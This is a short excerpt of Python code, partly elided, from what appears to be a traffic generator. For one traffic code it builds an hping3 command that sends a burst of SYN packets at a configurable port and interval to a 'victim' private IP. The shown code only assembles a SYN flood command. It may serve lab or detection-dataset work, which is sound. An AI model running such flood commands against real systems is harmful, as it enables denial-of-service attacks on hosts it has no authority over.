...
def generate_traffic_by_code(
    ...
    port: int = 80,
    interval_microseconds: int | None = None,
) -> int:
    ...
    if traffic_code == "1":
        ...
        final_interval_microseconds = (
            interval_microseconds if interval_microseconds is not None else 5000
        )
        if final_packet_count <= 0:
            print("Packet count must be positive.")
            return 1
        if final_interval_microseconds <= 0:
            print("SYN interval must be positive.")
            return 1
        command = (
            f"sudo hping3 -q -S -p {port} -c {final_packet_count} "
            f"-i u{final_interval_microseconds} {victim_private_ip}"
        )
